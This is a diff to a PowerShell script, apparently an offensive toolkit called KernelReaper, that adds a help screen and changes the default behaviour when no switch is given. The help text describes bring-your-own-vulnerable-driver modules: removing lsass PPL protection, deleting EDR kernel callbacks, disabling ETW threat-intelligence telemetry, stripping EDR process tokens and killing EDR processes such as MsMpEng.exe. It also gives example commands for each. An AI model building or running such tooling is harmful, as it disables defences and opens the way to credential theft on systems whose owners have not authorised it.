@@ -37,10 +37,48 @@ param(
     [int[]]$TargetPID = @(),
     [switch]$All,
     [switch]$CallbacksDryRun,
-    [string]$DebugLog = ""
+    [string]$DebugLog = "",
+    [Alias('h')][switch]$Help
 )
 
 $ErrorActionPreference = 'Stop'
+
+function Show-Help {
+    Write-Host ""
+    Write-Host "  KernelReaper - Kernel-level EDR Evasion Toolkit" -ForegroundColor Cyan
+    Write-Host "  RootLaser.sys (KDU Provider 65) - WHQL-signed driver" -ForegroundColor DarkCyan
+    Write-Host ""
+    Write-Host "  Usage:" -ForegroundColor Yellow
+    Write-Host "    .\Invoke-KernelReaper.ps1 [options]"
+    Write-Host ""
+    Write-Host "  Modules:" -ForegroundColor Yellow
+    Write-Host "    -RemovePPL          Remove RunAsPPL protection from lsass.exe"
+    Write-Host "    -Callbacks          Remove EDR kernel callbacks (process, thread, image, object, registry)"
+    Write-Host "    -CallbacksDryRun    List EDR kernel callbacks without removing them"
+    Write-Host "    -ETWBlind           Disable ETW Threat Intelligence provider"
+    Write-Host "    -TokenDowngrade     Strip privileges from EDR process tokens"
+    Write-Host "    -EDRKill            Terminate EDR processes (strips protections first)"
+    Write-Host "    -All                Run all modules"
+    Write-Host ""
+    Write-Host "  Options:" -ForegroundColor Yellow
+    Write-Host "    -TargetEDR <list>   Comma-separated EDR process names (default: built-in list)"
+    Write-Host "    -TargetPID <pids>   Target specific PIDs instead of EDR list"
+    Write-Host "    -Drv64Path <path>   Path to drv64.dll (default: .\drv64.dll)"
+    Write-Host "    -DriverPath <path>  Path to pre-extracted RootLaser.sys"
+    Write-Host "    -ServiceName <name> Kernel service name (default: RLaserSvc)"
+    Write-Host "    -DebugLog <path>    Write debug log to file"
+    Write-Host "    -h                  Show this help"
+    Write-Host ""
+    Write-Host "  Examples:" -ForegroundColor Yellow
+    Write-Host "    .\Invoke-KernelReaper.ps1 -RemovePPL"
+    Write-Host "    .\Invoke-KernelReaper.ps1 -Callbacks -ETWBlind"
+    Write-Host "    .\Invoke-KernelReaper.ps1 -EDRKill -TargetEDR `"MsMpEng.exe,CrowdStrike.exe`""
+    Write-Host "    .\Invoke-KernelReaper.ps1 -All"
+    Write-Host ""
+    exit 0
+}
+
+if ($Help) { Show-Help }
 
 $CSharpCode = @'
 using System;
@@ -1151,14 +1189,13 @@ public static class PPLRemover
 
 # --- Main ---
 
-Write-Host "`n=== KernelReaper - EDR Evasion Toolkit (RootLaser / KDU Provider 65) ===" -ForegroundColor Cyan
-Write-Host ""
-
 if ($All) { $RemovePPL = $true; $Callbacks = $true; $TokenDowngrade = $true; $ETWBlind = $true; $EDRKill = $true }
 if (-not ($RemovePPL -or $Callbacks -or $CallbacksDryRun -or $TokenDowngrade -or $ETWBlind -or $EDRKill)) {
-    $RemovePPL = $true
-    Write-Host "[*] No switch specified, defaulting to -RemovePPL" -ForegroundColor Yellow
+    Show-Help
 }
+
+Write-Host "`n=== KernelReaper - EDR Evasion Toolkit (RootLaser / KDU Provider 65) ===" -ForegroundColor Cyan
+Write-Host ""
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) { Write-Host "[-] Admin required." -ForegroundColor Red; exit 1 }
